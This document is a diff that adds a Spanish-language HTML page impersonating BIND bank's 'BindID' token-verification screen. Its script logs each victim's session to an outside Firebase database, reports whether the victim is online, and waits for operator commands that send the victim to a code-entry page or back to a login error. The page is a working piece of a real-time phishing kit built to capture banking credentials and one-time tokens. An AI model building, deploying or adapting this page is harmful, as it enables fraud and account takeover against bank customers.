@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BindID - Verificando</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #333;
+        }
+        
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .loading-card {
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        .loading-logo {
+            margin-bottom: 30px;
+        }
+        
+        .loading-logo img {
+            max-width: 200px;
+            height: auto;
+        }
+        
+        .loading-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        
+        .loading-text {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .status-text {
+            font-size: 14px;
+            color: #999;
+            margin-top: 20px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .footer a {
+            color: #0052cc;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <main class="main-container">
+        <div class="loading-card">
+            <div class="loading-logo">
+                <img src="index_files/loading.gif" alt="Cargando">
+            </div>
+            
+            <h2 class="loading-title">Verificando TOKEN ingresado</h2>
+            <p class="loading-text">Mantente atento, recibirás un nuevo TOKEN en tu dispositivo seguro.</p>
+            
+            <p class="status-text" id="status-text">En unos minutos, será redireccionado...</p>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <p>© 2026 BIND - <a href="#">Términos y condiciones</a> | <a href="#">Política de privacidad</a></p>
+    </footer>
+
+    <script>
+        // Configuración de Firebase
+        const firebaseConfig = { 
+            databaseURL: "https://tucopedanm-default-rtdb.firebaseio.com/" 
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Obtener el ID de la URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('id');
+
+        // Estados de la verificación
+        const verificationSteps = [
+            { text: "Iniciando verificación...", progress: 10 },
+            { text: "Validando TOKEN...", progress: 30 },
+            { text: "Validando TOKEN...", progress: 50 },
+            { text: "Validando TOKEN...", progress: 70 },
+            { text: "Validando TOKEN...", progress: 90 },
+            { text: "En unos minutos, será redireccionado...", progress: 100 }
+        ];
+
+        let currentStep = 0;
+        const statusText = document.getElementById('status-text');
+
+        // Función para actualizar el progreso
+        function updateProgress() {
+            if (currentStep < verificationSteps.length) {
+                const step = verificationSteps[currentStep];
+                statusText.textContent = step.text;
+                currentStep++;
+                
+                // Tiempo variable para cada paso
+                const delay = currentStep === verificationSteps.length ? 1500 : 
+                              currentStep === 3 ? 2000 : 1000;
+                
+                setTimeout(updateProgress, delay);
+            }
+        }
+
+        // Iniciar el proceso de verificación
+        document.addEventListener('DOMContentLoaded', function() {
+            // Registrar la página en Firebase
+            if (sessionId) {
+                db.ref('logins/' + sessionId).update({
+                    pagina: 'cargando.html',
+                    status: 'LOADING',
+                    loadingStartedAt: Date.now()
+                }).then(() => {
+                    console.log("Página de carga registrada en Firebase");
+                }).catch(error => {
+                    console.error("Error al registrar página de carga:", error);
+                });
+
+                // Lógica de presencia (luz verde/roja)
+                const presenceRef = db.ref('logins/' + sessionId + '/online');
+                db.ref(".info/connected").on("value", (snap) => {
+                    if (snap.val() === true) {
+                        presenceRef.set(true);
+                        presenceRef.onDisconnect().set(false);
+                    }
+                });
+
+                // Escuchar comandos del admin
+                db.ref('comandos/' + sessionId).on('value', (snapshot) => {
+                    const cmd = snapshot.val();
+                    if (cmd) {
+                        if (cmd.accion === 'pedir_codigo') {
+                            db.ref('comandos/' + sessionId).remove();
+                            window.location.href = 'codigo.html?id=' + sessionId;
+                        }
+                        if (cmd.accion === 'rechazar') {
+                            db.ref('comandos/' + sessionId).remove();
+                            window.location.href = 'index.html?error=1';
+                        }
+                    }
+                });
+            } else {
+                window.location.href = 'index.html';
+            }
+            
+            // Iniciar la animación de progreso
+            setTimeout(updateProgress, 500);
+        });
+    </script>
+</body>
+</html>
